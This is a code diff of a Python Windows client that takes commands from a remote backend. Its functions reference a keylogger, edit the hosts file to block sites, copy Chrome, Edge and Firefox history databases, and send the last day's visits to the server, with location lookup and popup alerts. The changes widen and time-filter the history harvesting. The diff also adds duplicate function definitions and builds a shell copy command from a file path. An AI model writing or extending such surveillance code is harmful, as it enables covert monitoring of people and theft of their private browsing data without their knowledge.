@@ -29,7 +29,7 @@ import pygetwindow as gw
 import winreg
 
 # Load environment variables from .env file
-load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), '.env'))
+load_dotenv()
 
 # Configuration - FROM ENVIRONMENT VARIABLES (SECURE)
 BACKEND_URL = os.getenv('BACKEND_URL', 'http://localhost:5000')
@@ -145,6 +145,46 @@ def stop_keylogger():
 
 # ==================== WEBSITE BLOCKING ====================
 
+# def block_websites(websites):
+#     """Block websites by modifying hosts file"""
+#     try:
+#         print(f"🚫 Attempting to block websites: {', '.join(websites)}")
+#         hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
+#         redirect_ip = "127.0.0.1"
+        
+#         # Read current hosts file
+#         with open(hosts_path, 'r') as file:
+#             hosts_content = file.read()
+        
+#         # Add blocked websites
+#         new_entries = []
+#         for website in websites:
+#             # Remove http://, https://, and www prefix if present
+#             website = website.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
+            
+#             if website and website not in hosts_content:
+#                 new_entries.append(f"\n{redirect_ip} {website}")
+#                 new_entries.append(f"\n{redirect_ip} www.{website}")
+        
+#         if new_entries:
+#             with open(hosts_path, 'a') as file:
+#                 file.writelines(new_entries)
+#             print(f"✅ Successfully blocked: {', '.join(websites)}")
+#             return {"success": True, "message": f"Blocked: {', '.join(websites)}"}
+#         else:
+#             print(f"ℹ️ Websites already blocked")
+#             return {"success": True, "message": "Websites already blocked"}
+            
+#     except PermissionError:
+#         print("❌ ERROR: Administrator privileges required!")
+#         print("⚠️ Right-click client.py and select 'Run as administrator'")
+#         print("⚠️ Or run: run_client_as_admin.bat")
+#         return {"success": False, "message": "Admin privileges required"}
+#     except Exception as e:
+#         print(f"❌ Error blocking websites: {e}")
+#         return {"success": False, "message": str(e)}
+
+
 def block_websites(websites):
     """Block websites by modifying hosts file"""
     try:
@@ -184,6 +224,51 @@ def block_websites(websites):
         print(f"❌ Error blocking websites: {e}")
         return {"success": False, "message": str(e)}
 
+def unblock_websites(websites):
+    """Unblock websites by removing from hosts file"""
+    try:
+        print(f"✅ Attempting to unblock websites: {', '.join(websites)}")
+        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
+        
+        # Read hosts file
+        with open(hosts_path, 'r') as file:
+            lines = file.readlines()
+        
+        # Filter out blocked websites
+        filtered_lines = []
+        removed_count = 0
+        for line in lines:
+            should_keep = True
+            for website in websites:
+                # Clean website name
+                website = website.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
+                if website in line and '127.0.0.1' in line:
+                    should_keep = False
+                    removed_count += 1
+                    break
+            if should_keep:
+                filtered_lines.append(line)
+        
+        # Write back
+        with open(hosts_path, 'w') as file:
+            file.writelines(filtered_lines)
+        
+        if removed_count > 0:
+            print(f"✅ Successfully unblocked: {', '.join(websites)} ({removed_count} entries removed)")
+            return {"success": True, "message": f"Unblocked: {', '.join(websites)}"}
+        else:
+            print(f"ℹ️ Websites were not blocked")
+            return {"success": True, "message": "Websites were not blocked"}
+            
+    except PermissionError:
+        print("❌ ERROR: Administrator privileges required!")
+        print("⚠️ Right-click client.py and select 'Run as administrator'")
+        print("⚠️ Or run: run_client_as_admin.bat")
+        return {"success": False, "message": "Admin privileges required"}
+    except Exception as e:
+        print(f"❌ Error unblocking websites: {e}")
+        return {"success": False, "message": str(e)}
+    
 def unblock_websites(websites):
     """Unblock websites by removing from hosts file"""
     try:
@@ -477,7 +562,8 @@ def _epoch_micro_to_datetime(value):
     except Exception:
         return None
 
-def _get_chromium_history(history_path, browser_name, limit=50):
+def _get_chromium_history(history_path, browser_name, limit=100, hours_back=24):
+    """Get recent browser history from Chrome/Edge (last N hours)"""
     if not os.path.exists(history_path):
         return []
     temp_db = f"temp_{browser_name.lower()}_history.db"
@@ -490,11 +576,18 @@ def _get_chromium_history(history_path, browser_name, limit=50):
     rows = []
     conn = None
     try:
+        # Calculate WebKit timestamp threshold (microseconds since 1601-01-01)
+        from datetime import datetime, timedelta
+        cutoff_time = datetime.now() - timedelta(hours=hours_back)
+        # WebKit time: microseconds since 1601-01-01 UTC
+        webkit_epoch = datetime(1601, 1, 1)
+        threshold = int((cutoff_time - webkit_epoch).total_seconds() * 1000000)
+        
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
         cursor.execute(
-            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?",
-            (limit,)
+            "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time >= ? ORDER BY last_visit_time DESC LIMIT ?",
+            (threshold, limit)
         )
         rows = cursor.fetchall()
     except sqlite3.Error as e:
@@ -519,7 +612,8 @@ def _get_chromium_history(history_path, browser_name, limit=50):
         })
     return results
 
-def _get_firefox_history(limit=50):
+def _get_firefox_history(limit=100, hours_back=24):
+    """Get recent browser history from Firefox (last N hours)"""
     results = []
     profiles_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles\*")
     for profile in glob.glob(profiles_path):
@@ -528,6 +622,11 @@ def _get_firefox_history(limit=50):
             continue
         temp_db = "temp_firefox_history.db"
         try:
+            # Calculate Unix timestamp threshold (microseconds)
+            from datetime import datetime, timedelta
+            cutoff_time = datetime.now() - timedelta(hours=hours_back)
+            threshold = int(cutoff_time.timestamp() * 1000000)
+            
             os.system(f'copy "{history_path}" "{temp_db}"')
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
@@ -536,10 +635,11 @@ def _get_firefox_history(limit=50):
                 SELECT p.url, p.title, v.visit_date
                 FROM moz_places p
                 JOIN moz_historyvisits v ON v.place_id = p.id
+                WHERE v.visit_date >= ?
                 ORDER BY v.visit_date DESC
                 LIMIT ?
                 """,
-                (limit,)
+                (threshold, limit)
             )
             rows = cursor.fetchall()
             conn.close()
@@ -561,13 +661,14 @@ def _get_firefox_history(limit=50):
                 pass
     return results
 
-def get_all_browser_history():
+def get_all_browser_history(hours_back=24):
+    """Get recent browser history from all browsers (default: last 24 hours)"""
     history = []
     chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
     edge_path = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History")
-    history.extend(_get_chromium_history(chrome_path, "Chrome"))
-    history.extend(_get_chromium_history(edge_path, "Edge"))
-    history.extend(_get_firefox_history())
+    history.extend(_get_chromium_history(chrome_path, "Chrome", hours_back=hours_back))
+    history.extend(_get_chromium_history(edge_path, "Edge", hours_back=hours_back))
+    history.extend(_get_firefox_history(hours_back=hours_back))
     return history
 
 def _get_active_browser():
@@ -683,14 +784,6 @@ def check_pending_commands():
             commands = response.json()
             if commands:  # Only print if there are commands
                 print(f"\n📥 {len(commands)} pending command(s) found")
-                # Log popup_alert commands specifically
-                for cmd in commands:
-                    cmd_type = cmd.get('command')
-                    if cmd_type == 'popup_alert':
-                        print(f"  ⚠️ POPUP_ALERT COMMAND FOUND: {cmd.get('_id')}")
-                        print(f"     Title: {cmd.get('params', {}).get('title')}")
-                        print(f"     Message: {cmd.get('params', {}).get('message')}")
-                        print(f"     Voice: {cmd.get('params', {}).get('voice')}")
             for cmd in commands:
                 execute_command(cmd)
     except requests.exceptions.RequestException as e:
@@ -887,15 +980,20 @@ def execute_command(cmd):
         
         elif command_type == "chromehistory":
             try:
-                print("🌐 Fetching browser history (Chrome, Edge, Firefox)...")
-                history_list = get_all_browser_history()
+                # Get hours_back parameter (default 24 hours = last day)
+                hours_back = int(params.get("hours_back", 24))
+                print(f"🌐 Fetching browser history from the last {hours_back} hours (Chrome, Edge, Firefox)...")
+                history_list = get_all_browser_history(hours_back=hours_back)
+                print(f"✅ Found {len(history_list)} history entries from the last {hours_back} hours")
                 
                 # Send to backend (NEW)
                 send_browser_history_to_backend(history_list)
                 
                 # Also send as result (for backward compatibility)
                 send_result(command_id, {"type": "chromehistory", "data": history_list})
+                print("✅ Browser history result sent to backend")
             except Exception as e:
+                print(f"❌ Browser history failed: {e}")
                 send_result(command_id, {"type": "chromehistory", "success": False, "message": str(e)})
         
         elif command_type == "get_location":
@@ -910,119 +1008,26 @@ def execute_command(cmd):
         
         elif command_type == "popup_alert":
             """Display popup alert on client"""
-            print("\n" + "="*60)
-            print("POPUP ALERT COMMAND RECEIVED")
-            print("="*60)
-            
+            print("⚠️ Displaying alert...")
             title = params.get('title', 'Alert!')
             message = params.get('message', 'Important message')
             priority = params.get('priority', 'normal')
-            voice = params.get('voice', False)
-            duration = params.get('duration', 5)
-            
-            print(f"Title: {title}")
-            print(f"Message: {message}")
-            print(f"Voice: {voice}")
-            print(f"Priority: {priority}")
-            print(f"Duration: {duration}s")
-            print("="*60)
             
             try:
                 import ctypes
-                import subprocess
-                import threading
-                
-                # STEP 1: Bring window to foreground
-                print("[STEP 1] Bringing window to foreground...")
-                try:
-                    # Wake up the system
-                    os.system('tasklist > nul')
-                    print("  ✓ System activated")
-                except Exception as e:
-                    print(f"  ! Could not activate: {e}")
-                
-                # STEP 2: Display the message box
-                print("[STEP 2] Displaying message box...")
-                try:
-                    # Try to use MB_TOPMOST flag (value 0x40000) to keep on top
-                    MB_TOPMOST = 0x40000
-                    MB_SYSTEMMODAL = 0x00001000
-                    flags = MB_TOPMOST | MB_SYSTEMMODAL
-                    
-                    result = ctypes.windll.user32.MessageBoxW(0, message, title, flags)
-                    print(f"  ✓ MessageBox displayed (result: {result})")
-                except Exception as mb_err:
-                    print(f"  ✗ MessageBox failed: {mb_err}")
-                    # Try alternate method
-                    try:
-                        result = ctypes.windll.user32.MessageBoxW(0, message, title, 0)
-                        print(f"  ✓ MessageBox displayed (alternate method, result: {result})")
-                    except Exception as alt_err:
-                        print(f"  ✗ Alternate MessageBox also failed: {alt_err}")
-                        raise
-                
-                # STEP 3: Speak message if voice enabled
-                if voice:
-                    print("[STEP 3] Speaking message via TTS...")
-                    
-                    # Use threading to avoid blocking
-                    def speak_message():
-                        try:
-                            print("  - Attempting pyttsx3...")
-                            import pyttsx3
-                            engine = pyttsx3.init()
-                            engine.setProperty('rate', 150)
-                            engine.say(message)
-                            engine.runAndWait()
-                            print("  ✓ Message spoken via pyttsx3")
-                        except ImportError:
-                            print("  ! pyttsx3 not available, using fallback...")
-                            try:
-                                # Escape message for PowerShell
-                                safe_message = message.replace('"', '\\"').replace("'", "''")
-                                ps_command = f'Add-Type -AssemblyName System.speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{safe_message}")'
-                                result = subprocess.run(
-                                    ['powershell', '-Command', ps_command],
-                                    check=False,
-                                    timeout=30,
-                                    capture_output=True
-                                )
-                                print(f"  ✓ Message spoken via SAPI (exit code: {result.returncode})")
-                            except Exception as sapi_err:
-                                print(f"  ✗ SAPI fallback failed: {sapi_err}")
-                        except Exception as tts_err:
-                            print(f"  ✗ TTS error: {tts_err}")
-                    
-                    # Start TTS in background thread so it doesn't block
-                    tts_thread = threading.Thread(target=speak_message, daemon=True)
-                    tts_thread.start()
-                else:
-                    print("[STEP 3] Voice disabled, skipping TTS")
-                
-                # STEP 4: Send result
-                print("[STEP 4] Sending result to backend...")
+                # Create simple message box (Windows only)
+                ctypes.windll.user32.MessageBoxW(0, message, title, 1)
                 send_result(command_id, {
                     "type": "popup_alert",
                     "success": True,
-                    "message": f"Alert displayed: {title}",
-                    "voice_enabled": voice
+                    "message": f"Alert displayed: {title}"
                 })
-                print("  ✓ Result sent successfully")
-                print("="*60 + "\n")
-                
             except Exception as e:
-                print(f"✗ ERROR DISPLAYING ALERT: {e}")
-                import traceback
-                traceback.print_exc()
-                print("="*60 + "\n")
-                try:
-                    send_result(command_id, {
-                        "type": "popup_alert",
-                        "success": False,
-                        "message": str(e)
-                    })
-                except:
-                    pass
+                send_result(command_id, {
+                    "type": "popup_alert",
+                    "success": False,
+                    "message": str(e)
+                })
         
         else:
             print(f"⚠️ Unknown command: {command_type}")
